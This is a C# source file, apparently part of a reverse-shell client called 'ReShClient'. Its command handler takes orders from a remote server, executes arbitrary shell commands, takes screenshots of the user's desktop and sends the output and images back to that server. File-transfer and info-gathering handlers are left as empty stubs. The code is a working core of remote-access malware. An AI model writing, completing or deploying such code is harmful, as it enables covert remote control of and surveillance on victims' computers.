using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ReShClient
{
    public static class CommandHandler
    {
        public static RSClient Client;
        public static void ExecuteCommand(Command command)
        {
            switch (command.Type)
            {
                case CommandType.ShellCommand:
                    {
                        Shell shell;
                        if (!command.TryGetData(out shell))
                            goto default;
                        ShellResult request = new ShellResult();
                        request.Result = SystemUtility.ExecuteCommand(shell.Command);
                        _ = Task.Run(() => Client.SendCommandResult(command.ClientId, command.Type, request));
                        break;
                    }
                case CommandType.Screenshot:
                    {
                        ScreenshotResult result = new ScreenshotResult();
                        try
                        {
                            Bitmap screenshot = SystemUtility.CaptureScreen();
                            byte[] data = SystemUtility.BitmapToBytes(screenshot, System.Drawing.Imaging.ImageFormat.Jpeg);
                            result.Status = true;
                            result.Screenshot = data;
                        }
                        catch (Exception ex)
                        {
                            result.Status = false;
                            MyLogger.LogError($"[*]Error capturing screenshot: {ex.Message}");
                        }
                        _ = Task.Run(() => Client.SendCommandResult(command.ClientId, command.Type, result));
                        break;
                    }
                case CommandType.FileTransfer:
                    {
                        break;
                    }
                case CommandType.GetInfo:
                    {
                        break;
                    }
                default:
                    {
                        break;
                    }
            }
        }
        public static void OnCommandReceived(Command command)
        {
            MyLogger.LogDebug($"Received command: {command.Type} from server.");
            _ = Task.Run(() => ExecuteCommand(command));
        }
    }
}
